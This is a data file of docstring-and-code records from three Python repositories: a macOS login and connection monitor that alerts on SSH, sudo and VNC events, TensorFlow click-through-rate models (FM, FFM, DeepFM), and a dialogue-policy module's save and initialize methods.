{"docstring": "\"\"\"runloop to parse events from sources and dispatch alerts\"\"\"\n", "func_signal": "def watch_sources():\n", "code": "sources_info = '\\n' + get_sources_info()\nfirst_line = True\nfor source, line in get_new_lines():\n    if first_line:\n        first_line = False\n        notify(sources_info, 'Started Watching Sources')\n\n    # parse the fetched lines, if not alert-worthy, alert_type will be None\n    alert_type, title, content = parse_line(line, source)\n\n    if alert_type == 'notify':\n        notify(content, title)\n\n    if alert_type == 'alert':\n        alert(content, title)", "path": "Security Growler.app\\Contents\\Resources\\growler.py", "repo_name": "pirate/security-growler", "stars": 853, "license": "None", "language": "python", "size": 13778}
{"docstring": "\"\"\"infinite runloop which reads lines out of their source generators\"\"\"\n\n", "func_signal": "def get_new_lines(source_generators=all_source_generators, delay=POLLING_SPEED):\n", "code": "while True:\n    for source, generator in source_generators.iteritems():\n        next_line = next(generator)\n        while next_line:\n            yield (source, next_line)\n            next_line = next(generator)\n    sleep(delay)", "path": "Security Growler.app\\Contents\\Resources\\sources\\__init__.py", "repo_name": "pirate/security-growler", "stars": 853, "license": "None", "language": "python", "size": 13778}
{"docstring": "\"\"\"parse out the user and connection source from an SSH log event line\"\"\"\n", "func_signal": "def parse_line(line):\n", "code": "user = (\n    word_after(line, ' for ')\n    if ' for ' in line else ' '\n)\nsrc = (\n    word_after(line, ' from ')\n    if ' from ' in line else\n    (word_after(line, ' by ') if ' by 'in line else '')\n)\nreturn user, src", "path": "Security Growler.app\\Contents\\Resources\\parsers\\ssh.py", "repo_name": "pirate/security-growler", "stars": 853, "license": "None", "language": "python", "size": 13778}
{"docstring": "\"\"\"/var/log/system.log      : for sudo,auth events\n   port 5900                : for vnc events\n   port 22                  : for ssh events\n\"\"\"\n", "func_signal": "def get_sources_info():\n", "code": "return '\\n'.join(\n    '{0}: {1}'.format(\n        ('port %s' % source if type(source) == int else source).ljust(25),\n        'for %s events' % ','.join(\n            f.__name__.split('.', 1)[-1]  # parsers.ssh -> ssh\n            for f in parsers\n        )\n    )\n    for source, parsers in PARSERS.items()\n)", "path": "Security Growler.app\\Contents\\Resources\\parsers\\__init__.py", "repo_name": "pirate/security-growler", "stars": 853, "license": "None", "language": "python", "size": 13778}
{"docstring": "\"\"\"generator which yields new connections on a port or None\"\"\"\n", "func_signal": "def gen_conns(port):\n", "code": "existing = get_connections(port)\nyield 'ready'    # otherwise it will hang until the first change appears\n\nwhile True:\n    new = get_connections(port)\n    if new and new != existing:\n        existing = new\n        for line in get_details(port):\n            yield line or None\n    else:\n        yield None", "path": "Security Growler Light.app\\Contents\\Resources\\sources\\sockets.py", "repo_name": "pirate/security-growler", "stars": 853, "license": "None", "language": "python", "size": 13778}
{"docstring": "\"\"\"parse out the user and connection source from an SSH log event line\"\"\"\n", "func_signal": "def parse_line(line):\n", "code": "user = (\n    word_after(line, ' for ')\n    if ' for ' in line else ' '\n)\nsrc = (\n    word_after(line, ' from ')\n    if ' from ' in line else\n    (word_after(line, ' by ') if ' by 'in line else '')\n)\nreturn user, src", "path": "parsers\\ssh.py", "repo_name": "pirate/security-growler", "stars": 853, "license": "None", "language": "python", "size": 13778}
{"docstring": "\"\"\"get list of active connections on a given port\"\"\"\n", "func_signal": "def get_connections(port, state='ESTABLISHED'):\n", "code": "get_conn_list = FAST_CMD.format(port, state or '.*')\nreturn [\n    line.strip().split()[3:]\n    for line in os.popen(get_conn_list).read().strip().split('\\n')\n    if len(line.split()) > 5\n]", "path": "Security Growler Light.app\\Contents\\Resources\\sources\\sockets.py", "repo_name": "pirate/security-growler", "stars": 853, "license": "None", "language": "python", "size": 13778}
{"docstring": "\"\"\"get list of active connections on a given port\"\"\"\n", "func_signal": "def get_connections(port, state='ESTABLISHED'):\n", "code": "get_conn_list = FAST_CMD.format(port, state or '.*')\nreturn [\n    line.strip().split()[3:]\n    for line in os.popen(get_conn_list).read().strip().split('\\n')\n    if len(line.split()) > 5\n]", "path": "sources\\sockets.py", "repo_name": "pirate/security-growler", "stars": 853, "license": "None", "language": "python", "size": 13778}
{"docstring": "\"\"\"parse SSHD event log lines into pass and fail alerts messages\"\"\"\n", "func_signal": "def parse(line, source=None):\n", "code": "title, body = '', ''\n\nif KEYAUTH_EVENT_FILTER.findall(line) or PASSWORD_EVENT_FILTER.findall(line):\n    user, src = parse_line(line)\n    title = 'SSH LOGIN SUCCESS: %s' % user\n    method = 'Password' if ' keyboard' in line else 'Public Key'\n    body = 'from: %s using a %s' % (src, method)\n\n\nelif FAIL_EVENT_FILTER.findall(line):\n    user, src = parse_line(line)\n    summary = parse_summary(line)\n    title = 'SSH EVENT: %s' % user or (summary[:15] + '...')\n    body = 'from: %s | %s' % (src, summary)\n\nreturn ('alert' if title else None, title, body)", "path": "Security Growler Light.app\\Contents\\Resources\\parsers\\ssh.py", "repo_name": "pirate/security-growler", "stars": 853, "license": "None", "language": "python", "size": 13778}
{"docstring": "\"\"\"generator which yields new connections on a port or None\"\"\"\n", "func_signal": "def gen_conns(port):\n", "code": "existing = get_connections(port)\nyield 'ready'    # otherwise it will hang until the first change appears\n\nwhile True:\n    new = get_connections(port)\n    if new and new != existing:\n        existing = new\n        for line in get_details(port):\n            yield line or None\n    else:\n        yield None", "path": "sources\\sockets.py", "repo_name": "pirate/security-growler", "stars": 853, "license": "None", "language": "python", "size": 13778}
{"docstring": "\"\"\"generator which yields new lines from a logfile, or None\"\"\"\n", "func_signal": "def gen_lines(path):\n", "code": "with open(path, 'r') as logfile:\n    logfile.seek(0, 2)  # jump to end\n    yield 'ready'       # otherwise it will hang until the first change appears\n    while True:\n        yield logfile.readline().strip() or None", "path": "Security Growler.app\\Contents\\Resources\\sources\\logfile.py", "repo_name": "pirate/security-growler", "stars": 853, "license": "None", "language": "python", "size": 13778}
{"docstring": "\"\"\"parse out the user and connection source from an SSH log event line\"\"\"\n", "func_signal": "def parse_line(line):\n", "code": "user = (\n    word_after(line, ' for ')\n    if ' for ' in line else ' '\n)\nsrc = (\n    word_after(line, ' from ')\n    if ' from ' in line else\n    (word_after(line, ' by ') if ' by 'in line else '')\n)\nreturn user, src", "path": "Security Growler Light.app\\Contents\\Resources\\parsers\\ssh.py", "repo_name": "pirate/security-growler", "stars": 853, "license": "None", "language": "python", "size": 13778}
{"docstring": "\"\"\"generator which yields new lines from a logfile, or None\"\"\"\n", "func_signal": "def gen_lines(path):\n", "code": "with open(path, 'r') as logfile:\n    logfile.seek(0, 2)  # jump to end\n    yield 'ready'       # otherwise it will hang until the first change appears\n    while True:\n        yield logfile.readline().strip() or None", "path": "sources\\logfile.py", "repo_name": "pirate/security-growler", "stars": 853, "license": "None", "language": "python", "size": 13778}
{"docstring": "\"\"\"runloop to parse events from sources and dispatch alerts\"\"\"\n", "func_signal": "def watch_sources():\n", "code": "sources_info = '\\n' + get_sources_info()\nfirst_line = True\nfor source, line in get_new_lines():\n    if first_line:\n        first_line = False\n        notify(sources_info, 'Started Watching Sources')\n\n    # parse the fetched lines, if not alert-worthy, alert_type will be None\n    alert_type, title, content = parse_line(line, source)\n\n    if alert_type == 'notify':\n        notify(content, title)\n\n    if alert_type == 'alert':\n        alert(content, title)", "path": "Security Growler Light.app\\Contents\\Resources\\growler.py", "repo_name": "pirate/security-growler", "stars": 853, "license": "None", "language": "python", "size": 13778}
{"docstring": "\"\"\"runloop to parse events from sources and dispatch alerts\"\"\"\n", "func_signal": "def watch_sources():\n", "code": "sources_info = '\\n' + get_sources_info()\nfirst_line = True\nfor source, line in get_new_lines():\n    if first_line:\n        first_line = False\n        notify(sources_info, 'Started Watching Sources')\n\n    # parse the fetched lines, if not alert-worthy, alert_type will be None\n    alert_type, title, content = parse_line(line, source)\n\n    if alert_type == 'notify':\n        notify(content, title)\n\n    if alert_type == 'alert':\n        alert(content, title)", "path": "growler.py", "repo_name": "pirate/security-growler", "stars": 853, "license": "None", "language": "python", "size": 13778}
{"docstring": "\"\"\"infinite runloop which reads lines out of their source generators\"\"\"\n\n", "func_signal": "def get_new_lines(source_generators=all_source_generators, delay=POLLING_SPEED):\n", "code": "while True:\n    for source, generator in source_generators.iteritems():\n        next_line = next(generator)\n        while next_line:\n            yield (source, next_line)\n            next_line = next(generator)\n    sleep(delay)", "path": "sources\\__init__.py", "repo_name": "pirate/security-growler", "stars": 853, "license": "None", "language": "python", "size": 13778}
{"docstring": "\"\"\" Restore the previously trained parameters if there are any. \"\"\"\n", "func_signal": "def check_restore_parameters(sess, saver):\n", "code": "ckpt = tf.train.get_checkpoint_state(\"checkpoints\")\nif ckpt and ckpt.model_checkpoint_path:\n    logging.info(\"Loading parameters for the my CNN architectures...\")\n    saver.restore(sess, ckpt.model_checkpoint_path)\nelse:\n    logging.info(\"Initializing fresh parameters for the my Factorization Machine\")", "path": "FFM\\FFM.py", "repo_name": "Johnson0722/CTR_Prediction", "stars": 739, "license": "None", "language": "python", "size": 23}
{"docstring": "\"\"\"\nforward propagation\n:return: labels for each sample\n\"\"\"\n", "func_signal": "def inference(self):\n", "code": "v = tf.Variable(tf.truncated_normal(shape=[self.p, self.k], mean=0, stddev=0.01),dtype='float32')\n\n# Factorization Machine\nwith tf.variable_scope('FM'):\n    b = tf.get_variable('bias', shape=[2],\n                        initializer=tf.zeros_initializer())\n    w1 = tf.get_variable('w1', shape=[self.p, 2],\n                         initializer=tf.truncated_normal_initializer(mean=0,stddev=1e-2))\n    # shape of [None, 2]\n    self.linear_terms = tf.add(tf.matmul(self.X, w1), b)\n\n    # shape of [None, 1]\n    self.interaction_terms = tf.multiply(0.5,\n                                         tf.reduce_mean(\n                                             tf.subtract(\n                                                 tf.pow(tf.matmul(self.X, v), 2),\n                                                 tf.matmul(tf.pow(self.X, 2), tf.pow(v, 2))),\n                                             1, keep_dims=True))\n    # shape of [None, 2]\n    self.y_fm = tf.add(self.linear_terms, self.interaction_terms)\n\n# three-hidden-layer neural network, network shape of (200-200-200)\nwith tf.variable_scope('DNN',reuse=False):\n    # embedding layer\n    y_embedding_input = tf.reshape(tf.gather(v, self.feature_inds), [-1, self.field_cnt*self.k])\n    # first hidden layer\n    w1 = tf.get_variable('w1_dnn', shape=[self.field_cnt*self.k, 200],\n                         initializer=tf.truncated_normal_initializer(mean=0,stddev=1e-2))\n    b1 = tf.get_variable('b1_dnn', shape=[200],\n                         initializer=tf.constant_initializer(0.001))\n    y_hidden_l1 = tf.nn.relu(tf.matmul(y_embedding_input, w1) + b1)\n    # second hidden layer\n    w2 = tf.get_variable('w2', shape=[200, 200],\n                         initializer=tf.truncated_normal_initializer(mean=0,stddev=1e-2))\n    b2 = tf.get_variable('b2', shape=[200],\n                         initializer=tf.constant_initializer(0.001))\n    y_hidden_l2 = tf.nn.relu(tf.matmul(y_hidden_l1, w2) + b2)\n    # third hidden layer\n    w3 = tf.get_variable('w1', shape=[200, 200],\n                         initializer=tf.truncated_normal_initializer(mean=0,stddev=1e-2))\n    b3 = tf.get_variable('b1', shape=[200],\n                         initializer=tf.constant_initializer(0.001))\n    y_hidden_l3 = tf.nn.relu(tf.matmul(y_hidden_l2, w3) + b3)\n    # output layer\n    w_out = tf.get_variable('w_out', shape=[200, 2],\n                         initializer=tf.truncated_normal_initializer(mean=0,stddev=1e-2))\n    b_out = tf.get_variable('b_out', shape=[2],\n                         initializer=tf.constant_initializer(0.001))\n    self.y_dnn = tf.nn.relu(tf.matmul(y_hidden_l3, w_out) + b_out)\n# add FM output and DNN output\nself.y_out = tf.add(self.y_fm, self.y_dnn)\nself.y_out_prob = tf.nn.softmax(self.y_out)", "path": "Deep_FM\\DeepFM.py", "repo_name": "Johnson0722/CTR_Prediction", "stars": 739, "license": "None", "language": "python", "size": 23}
{"docstring": "\"\"\"training model\"\"\"\n", "func_signal": "def train_model(sess, model, epochs=10, print_every=500):\n", "code": "num_samples = 0\nlosses = []\n# Merge all the summaries and write them out to train_logs\nmerged = tf.summary.merge_all()\ntrain_writer = tf.summary.FileWriter('train_logs', sess.graph)\nfor e in range(epochs):\n    # get training data, iterable\n    train_data = pd.read_csv('../avazu_CTR/train.csv',\n                             chunksize=model.batch_size)\n    # batch_size data\n    for data in train_data:\n        actual_batch_size = len(data)\n        batch_X = []\n        batch_y = []\n        batch_idx = []\n        for i in range(actual_batch_size):\n            sample = data.iloc[i,:]\n            array,idx = one_hot_representation(sample,fields_train_dict, train_array_length)\n            batch_X.append(array[:-2])\n            batch_y.append(array[-1])\n            batch_idx.append(idx)\n        batch_X = np.array(batch_X)\n        batch_y = np.array(batch_y)\n        batch_idx = np.array(batch_idx)\n        # create a feed dictionary for this batch\n        feed_dict = {model.X: batch_X, model.y: batch_y,\n                     model.feature_inds: batch_idx, model.keep_prob:1}\n        loss, accuracy,  summary, global_step, _ = sess.run([model.loss, model.accuracy,\n                                                             merged,model.global_step,\n                                                             model.train_op], feed_dict=feed_dict)\n        # aggregate performance stats\n        losses.append(loss*actual_batch_size)\n\n        num_samples += actual_batch_size\n        # Record summaries and train.csv-set accuracy\n        train_writer.add_summary(summary, global_step=global_step)\n        # print training loss and accuracy\n        if global_step % print_every == 0:\n            logging.info(\"Iteration {0}: with minibatch training loss = {1} and accuracy of {2}\"\n                         .format(global_step, loss, accuracy))\n            saver.save(sess, \"checkpoints/model\", global_step=global_step)\n\n    # print loss of one epoch\n    total_loss = np.sum(losses)/num_samples\n    print(\"Epoch {1}, Overall loss = {0:.3g}\".format(total_loss, e+1))", "path": "Deep_FM\\DeepFM.py", "repo_name": "Johnson0722/CTR_Prediction", "stars": 739, "license": "None", "language": "python", "size": 23}
{"docstring": "\"\"\"\n:param config: configuration of hyperparameters\ntype of dict\n\"\"\"\n# number of latent factors\n", "func_signal": "def __init__(self, config):\n", "code": "self.k = config['k']\nself.lr = config['lr']\nself.batch_size = config['batch_size']\nself.reg_l1 = config['reg_l1']\nself.reg_l2 = config['reg_l2']\n# num of features\nself.p = feature_length\n# num of fields\nself.field_cnt = field_cnt", "path": "Deep_FM\\DeepFM.py", "repo_name": "Johnson0722/CTR_Prediction", "stars": 739, "license": "None", "language": "python", "size": 23}
{"docstring": "\"\"\"testing model\"\"\"\n# num samples\n", "func_signal": "def validation_model(sess, model, print_every=50):\n", "code": "num_samples = 0\n# num of correct predictions\nnum_corrects = 0\nlosses = []\n# Merge all the summaries and write them out to train_logs\nmerged = tf.summary.merge_all()\ntest_writer = tf.summary.FileWriter('test_logs', sess.graph)\n# get testing data, iterable\nvalidation_data = pd.read_csv('/home/katy/CTR_prediction/avazu_CTR/train.csv',\n                              chunksize=model.batch_size)\n# testing step\nvalid_step = 1\n# batch_size data\nfor data in validation_data:\n    actual_batch_size = len(data)\n    batch_X = []\n    batch_y = []\n    batch_idx = []\n    for i in range(actual_batch_size):\n        sample = data.iloc[i,:]\n        array,idx = one_hot_representation(sample,fields_train_dict, train_array_length)\n        batch_X.append(array[:-2])\n        batch_y.append(array[-1])\n        batch_idx.append(idx)\n    batch_X = np.array(batch_X)\n    batch_y = np.array(batch_y)\n    batch_idx = np.array(batch_idx)\n    # create a feed dictionary for this batch,\n    feed_dict = {model.X: batch_X, model.y: batch_y,\n             model.feature_inds: batch_idx, model.keep_prob:1}\n    loss, accuracy, correct, summary = sess.run([model.loss, model.accuracy,\n                                                 model.correct_prediction, merged,],\n                                                feed_dict=feed_dict)\n    # aggregate performance stats\n    losses.append(loss*actual_batch_size)\n    num_corrects += correct\n    num_samples += actual_batch_size\n    # Record summaries and train.csv-set accuracy\n    test_writer.add_summary(summary, global_step=valid_step)\n    # print training loss and accuracy\n    if valid_step % print_every == 0:\n        logging.info(\"Iteration {0}: with minibatch training loss = {1} and accuracy of {2}\"\n                     .format(valid_step, loss, accuracy))\n    valid_step += 1\n# print loss and accuracy of one epoch\ntotal_correct = num_corrects/num_samples\ntotal_loss = np.sum(losses)/num_samples\nprint(\"Overall test loss = {0:.3g} and accuracy of {1:.3g}\" \\\n      .format(total_loss,total_correct))", "path": "Deep_FM\\DeepFM.py", "repo_name": "Johnson0722/CTR_Prediction", "stars": 739, "license": "None", "language": "python", "size": 23}
{"docstring": "\"\"\" Restore the previously trained parameters if there are any. \"\"\"\n", "func_signal": "def check_restore_parameters(sess, saver):\n", "code": "ckpt = tf.train.get_checkpoint_state(\"checkpoints\")\nif ckpt and ckpt.model_checkpoint_path:\n    logging.info(\"Loading parameters for the my CNN architectures...\")\n    saver.restore(sess, ckpt.model_checkpoint_path)\nelse:\n    logging.info(\"Initializing fresh parameters for the my Factorization Machine\")", "path": "Deep_FM\\DeepFM.py", "repo_name": "Johnson0722/CTR_Prediction", "stars": 739, "license": "None", "language": "python", "size": 23}
{"docstring": "\"\"\"training model\"\"\"\n# Merge all the summaries and write them out to train_logs\n", "func_signal": "def train_model(sess, model, epochs=10, print_every=500):\n", "code": "merged = tf.summary.merge_all()\ntrain_writer = tf.summary.FileWriter('train_logs', sess.graph)\nfor e in range(epochs):\n    num_samples = 0\n    losses = []\n    # get training data, iterable\n    train_data = pd.read_csv('../avazu_CTR/train.csv', chunksize=model.batch_size)\n    # batch_size data\n    for data in train_data:\n        actual_batch_size = len(data)\n        batch_X = []\n        batch_y = []\n        for i in range(actual_batch_size):\n            sample = data.iloc[i,:]\n            array = one_hot_representation(sample, fields_train_dict, train_array_length)\n            batch_X.append(array[:-2])\n            batch_y.append(array[-1])\n        batch_X = np.array(batch_X)\n        batch_y = np.array(batch_y)\n        # create a feed dictionary for this batch\n        feed_dict = {model.X: batch_X, model.y: batch_y, model.keep_prob:1}\n        loss, accuracy,  summary, global_step, _ = sess.run([model.loss, model.accuracy,\n                                                             merged,model.global_step,\n                                                             model.train_op], feed_dict=feed_dict)\n        # aggregate performance stats\n        losses.append(loss*actual_batch_size)\n\n        num_samples += actual_batch_size\n        # Record summaries and train.csv-set accuracy\n        train_writer.add_summary(summary, global_step=global_step)\n        # print training loss and accuracy\n        if global_step % print_every == 0:\n            logging.info(\"Iteration {0}: with minibatch training loss = {1} and accuracy of {2}\"\n                         .format(global_step, loss, accuracy))\n            saver.save(sess, \"checkpoints/model\", global_step=global_step)\n    # print loss of one epoch\n    total_loss = np.sum(losses)/num_samples\n    print(\"Epoch {1}, Overall loss = {0:.3g}\".format(total_loss, e+1))", "path": "FFM\\FFM.py", "repo_name": "Johnson0722/CTR_Prediction", "stars": 739, "license": "None", "language": "python", "size": 23}
{"docstring": "\"\"\"\nOne hot presentation for every sample data\n:param fields_dict: fields value to array index\n:param sample: sample data, type of pd.series\n:param isample: sample index\n:return: sample index\n\"\"\"\n", "func_signal": "def one_hot_representation(sample, fields_dict, isample):\n", "code": "index = []\nfor field in fields_dict:\n    # get index of array\n    if field == 'hour':\n        field_value = int(str(sample[field])[-2:])\n    else:\n        field_value = sample[field]\n    ind = fields_dict[field][field_value]\n    index.append([isample,ind])\nreturn index", "path": "FM\\utilities.py", "repo_name": "Johnson0722/CTR_Prediction", "stars": 739, "license": "None", "language": "python", "size": 23}
{"docstring": "\"\"\"build graph for model\"\"\"\n", "func_signal": "def build_graph(self):\n", "code": "self.add_placeholders()\nself.inference()\nself.add_loss()\nself.add_accuracy()\nself.train()", "path": "Deep_FM\\DeepFM.py", "repo_name": "Johnson0722/CTR_Prediction", "stars": 739, "license": "None", "language": "python", "size": 23}
{"docstring": "\"\"\"\nOne hot presentation for every sample data\n:param fields_dict: fields value to array index\n:param sample: sample data, type of pd.series\n:param array_length: length of one-hot representation\n:return: one-hot representation, type of np.array\n\"\"\"\n", "func_signal": "def one_hot_representation(sample, fields_dict, array_length):\n", "code": "array = np.zeros([array_length])\nfor field in fields_dict:\n    # get index of array\n    if field == 'hour':\n        field_value = int(str(sample[field])[-2:])\n    else:\n        field_value = sample[field]\n    ind = fields_dict[field][field_value]\n    array[ind] = 1\nreturn array", "path": "FFM\\utilities.py", "repo_name": "Johnson0722/CTR_Prediction", "stars": 739, "license": "None", "language": "python", "size": 23}
{"docstring": "\"\"\"\nOne hot presentation for every sample data\n:param fields_dict: fields value to array index\n:param sample: sample data, type of pd.series\n:param array_length: length of one-hot representation\n:return: one-hot representation, type of np.array\n\"\"\"\n", "func_signal": "def one_hot_representation(sample, fields_dict, array_length):\n", "code": "array = np.zeros([array_length])\nidx = []\nfor field in fields_dict:\n    # get index of array\n    if field == 'hour':\n        field_value = int(str(sample[field])[-2:])\n    else:\n        field_value = sample[field]\n    ind = fields_dict[field][field_value]\n    array[ind] = 1\n    idx.append(ind)\nreturn array,idx[:21]", "path": "Deep_FM\\utilities.py", "repo_name": "Johnson0722/CTR_Prediction", "stars": 739, "license": "None", "language": "python", "size": 23}
{"docstring": "\"\"\"\nforward propagation\n:return: labels for each sample\n\"\"\"\n", "func_signal": "def inference(self):\n", "code": "with tf.variable_scope('linear_layer'):\n    b = tf.get_variable('bias', shape=[2],\n                        initializer=tf.zeros_initializer())\n    w1 = tf.get_variable('w1', shape=[self.p, 2],\n                         initializer=tf.truncated_normal_initializer(mean=0,stddev=1e-2))\n    # shape of [None, 2]\n    self.linear_terms = tf.add(tf.matmul(self.X, w1), b)\n\nwith tf.variable_scope('field_aware_interaction_layer'):\n    v = tf.get_variable('v', shape=[self.p, self.f, self.k], dtype='float32',\n                        initializer=tf.truncated_normal_initializer(mean=0, stddev=0.01))\n    # shape of [None, 1]\n    self.field_aware_interaction_terms = tf.constant(0, dtype='float32')\n    # build dict to find f, key of feature,value of field\n    for i in range(self.p):\n        for j in range(i+1,self.p):\n            self.field_aware_interaction_terms += tf.multiply(\n                tf.reduce_sum(tf.multiply(v[i,self.feature2field[i]], v[j,self.feature2field[j]])),\n                tf.multiply(self.X[:,i], self.X[:,j])\n            )\n# shape of [None, 2]\nself.y_out = tf.add(self.linear_terms, self.field_aware_interaction_terms)\nself.y_out_prob = tf.nn.softmax(self.y_out)", "path": "FFM\\FFM.py", "repo_name": "Johnson0722/CTR_Prediction", "stars": 739, "license": "None", "language": "python", "size": 23}
{"docstring": "\"\"\"training model\"\"\"\n# get testing data, iterable\n", "func_signal": "def test_model(sess, model, print_every = 50):\n", "code": "test_data = pd.read_csv('/home/katy/CTR_prediction/avazu_CTR/test.csv',\n                        chunksize=model.batch_size)\ntest_step = 1\n# batch_size data\nfor data in test_data:\n    actual_batch_size = len(data)\n    batch_X = []\n    batch_idx = []\n    for i in range(actual_batch_size):\n        sample = data.iloc[i,:]\n        array,idx = one_hot_representation(sample, fields_test_dict, test_array_length)\n        batch_X.append(array)\n        batch_idx.append(idx)\n\n    batch_X = np.array(batch_X)\n    batch_idx = np.array(batch_idx)\n    # create a feed dictionary for this batch\n    feed_dict = {model.X: batch_X, model.keep_prob:1, model.feature_inds:batch_idx}\n    # shape of [None,2]\n    y_out_prob = sess.run([model.y_out_prob], feed_dict=feed_dict)\n    # write to csv files\n    data['click'] = y_out_prob[0][:,-1]\n    if test_step == 1:\n        data[['id','click']].to_csv('Deep_FM_FTRL_v1.csv', mode='a', index=False, header=True)\n    else:\n        data[['id','click']].to_csv('Deep_FM_FTRL_v1.csv', mode='a', index=False, header=False)\n\n    test_step += 1\n    if test_step % 50 == 0:\n        logging.info(\"Iteration {0} has finished\".format(test_step))", "path": "Deep_FM\\DeepFM.py", "repo_name": "Johnson0722/CTR_Prediction", "stars": 739, "license": "None", "language": "python", "size": 23}
{"docstring": "# accuracy\n", "func_signal": "def add_accuracy(self):\n", "code": "self.correct_prediction = tf.equal(tf.cast(tf.argmax(model.y_out,1), tf.int64), model.y)\nself.accuracy = tf.reduce_mean(tf.cast(self.correct_prediction, tf.float32))\n# add summary to accuracy\ntf.summary.scalar('accuracy', self.accuracy)", "path": "Deep_FM\\DeepFM.py", "repo_name": "Johnson0722/CTR_Prediction", "stars": 739, "license": "None", "language": "python", "size": 23}
{"docstring": "\"\"\"training model\"\"\"\n# get testing data, iterable\n", "func_signal": "def test_model(sess, model, print_every = 50):\n", "code": "test_data = pd.read_csv('/home/johnso/PycharmProjects/News_recommendation/CTR_prediction/avazu_CTR/test.csv',\n                        chunksize=model.batch_size)\ntest_step = 1\n# batch_size data\nfor data in test_data:\n    actual_batch_size = len(data)\n    batch_X = []\n    for i in range(actual_batch_size):\n        sample = data.iloc[i,:]\n        array = one_hot_representation(sample,fields_dict,test_array_length)\n        batch_X.append(array)\n\n    batch_X = np.array(batch_X)\n\n    # create a feed dictionary for this batch\n    feed_dict = {model.X: batch_X, model.keep_prob:1}\n    # shape of [None,2]\n    y_out_prob = sess.run([model.y_out_prob], feed_dict=feed_dict)\n    # write to csv files\n    data['click'] = y_out_prob[0][:,-1]\n    if test_step == 1:\n        data[['id','click']].to_csv('FM_FTRL_v1.csv', mode='a', index=False, header=True)\n    else:\n        data[['id','click']].to_csv('FM_FTRL_v1.csv', mode='a', index=False, header=False)\n\n    test_step += 1\n    if test_step % 50 == 0:\n        logging.info(\"Iteration {0} has finished\".format(test_step))", "path": "FFM\\FFM.py", "repo_name": "Johnson0722/CTR_Prediction", "stars": 739, "license": "None", "language": "python", "size": 23}
{"docstring": "# Applies exponential decay to learning rate\n", "func_signal": "def train(self):\n", "code": "self.global_step = tf.Variable(0, trainable=False)\n# define optimizer\noptimizer = tf.train.FtrlOptimizer(self.lr, l1_regularization_strength=self.reg_l1,\n                                   l2_regularization_strength=self.reg_l2)\nextra_update_ops = tf.get_collection(tf.GraphKeys.UPDATE_OPS)\nwith tf.control_dependencies(extra_update_ops):\n    self.train_op = optimizer.minimize(self.loss, global_step=self.global_step)", "path": "Deep_FM\\DeepFM.py", "repo_name": "Johnson0722/CTR_Prediction", "stars": 739, "license": "None", "language": "python", "size": 23}
{"docstring": "# accuracy\n", "func_signal": "def add_accuracy(self):\n", "code": "self.correct_prediction = tf.equal(tf.cast(tf.argmax(model.y_out,1), tf.int64), model.y)\nself.accuracy = tf.reduce_mean(tf.cast(self.correct_prediction, tf.float32))\n# add summary to accuracy\ntf.summary.scalar('accuracy', self.accuracy)", "path": "FFM\\FFM.py", "repo_name": "Johnson0722/CTR_Prediction", "stars": 739, "license": "None", "language": "python", "size": 23}
{"docstring": "\"\"\"\n:param config: configuration of hyperparameters\ntype of dict\n\"\"\"\n# number of latent factors\n", "func_signal": "def __init__(self, config):\n", "code": "self.k = config['k']\n# num of fields\nself.f = config['f']\n# num of features\nself.p = feature_length\nself.lr = config['lr']\nself.batch_size = config['batch_size']\nself.reg_l1 = config['reg_l1']\nself.reg_l2 = config['reg_l2']\nself.feature2field = config['feature2field']", "path": "FFM\\FFM.py", "repo_name": "Johnson0722/CTR_Prediction", "stars": 739, "license": "None", "language": "python", "size": 23}
{"docstring": "\"\"\"build graph for model\"\"\"\n", "func_signal": "def build_graph(self):\n", "code": "self.add_placeholders()\nself.inference()\nself.add_loss()\nself.add_accuracy()\nself.train()", "path": "FFM\\FFM.py", "repo_name": "Johnson0722/CTR_Prediction", "stars": 739, "license": "None", "language": "python", "size": 23}
{"docstring": "# Applies exponential decay to learning rate\n", "func_signal": "def train(self):\n", "code": "self.global_step = tf.Variable(0, trainable=False)\n# define optimizer\noptimizer = tf.train.AdagradDAOptimizer(self.lr, global_step=self.global_step)\nextra_update_ops = tf.get_collection(tf.GraphKeys.UPDATE_OPS)\nwith tf.control_dependencies(extra_update_ops):\n    self.train_op = optimizer.minimize(self.loss, global_step=self.global_step)", "path": "FFM\\FFM.py", "repo_name": "Johnson0722/CTR_Prediction", "stars": 739, "license": "None", "language": "python", "size": 23}
{"docstring": "\"\"\"\nSaves the dialogue_policy model to the path provided\n\n:param path: path to save the model to\n:return:\n\"\"\"\n\n# Don't save if not training\n", "func_signal": "def save(self, path=None):\n", "code": "if not self.is_training:\n    return\n\nif not path:\n    path = 'models/policies/wolf_phc_policy.pkl'\n    print('No dialogue_policy file name provided. Using default: {0}'\n          .format(path))\n\n# If the directory does not exist, create it\nif not os.path.exists(os.path.dirname(path)):\n    os.makedirs(os.path.dirname(path), exist_ok=True)\n\nobj = {'Q': self.Q,\n       'pi': self.pi,\n       'mean_pi': self.mean_pi,\n       'state_counter': self.state_counter,\n       'a': self.alpha,\n       'e': self.epsilon,\n       'g': self.gamma}\n\nwith open(path, 'wb') as file:\n    pickle.dump(obj, file, pickle.HIGHEST_PROTOCOL)\n\nif self.statistics['total_turns'] > 0:\n    print('DEBUG > {0} WoLF PHC dialogue_policy supervision ratio: {1}'\n          .format(self.agent_role,\n                  float(\n                      self.statistics['supervised_turns'] /\n                      self.statistics['total_turns'])))\n\nprint(f'DEBUG > {self.agent_role} WoLF PHC policy state space '\n      f'size: {len(self.pi)}')", "path": "plato\\agent\\component\\dialogue_policy\\reinforcement_learning\\wolf_phc_policy.py", "repo_name": "uber-archive/plato-research-dialogue-system", "stars": 967, "license": "apache-2.0", "language": "python", "size": 15181}
{"docstring": "\"\"\"\nInitialize internal structures at the beginning of each dialogue\n\n:return: Nothing\n\"\"\"\n\n", "func_signal": "def initialize(self, args):\n", "code": "if 'train' in args:\n    self.is_training = bool(args['train'])\n\n    if 'learning_rate' in args:\n        self.alpha = float(args['learning_rate'])\n\n    if 'learning_decay_rate' in args:\n        self.alpha_decay_rate = float(args['learning_decay_rate'])\n\n    if 'exploration_rate' in args:\n        self.epsilon = float(args['exploration_rate'])\n\n    if 'exploration_decay_rate' in args:\n        self.exploration_decay_rate = \\\n            float(args['exploration_decay_rate'])\n\n    if 'gamma' in args:\n        self.gamma = float(args['gamma'])\n\n    if self.agent_role == 'user' and self.warmup_simulator:\n        if 'goal' in args:\n            self.warmup_simulator.initialize({args['goal']})\n        else:\n            print('WARNING ! No goal provided for WoLF PHC policy '\n                  'user simulator @ initialize')\n            self.warmup_simulator.initialize({})", "path": "plato\\agent\\component\\dialogue_policy\\reinforcement_learning\\wolf_phc_policy.py", "repo_name": "uber-archive/plato-research-dialogue-system", "stars": 967, "license": "apache-2.0", "language": "python", "size": 15181}
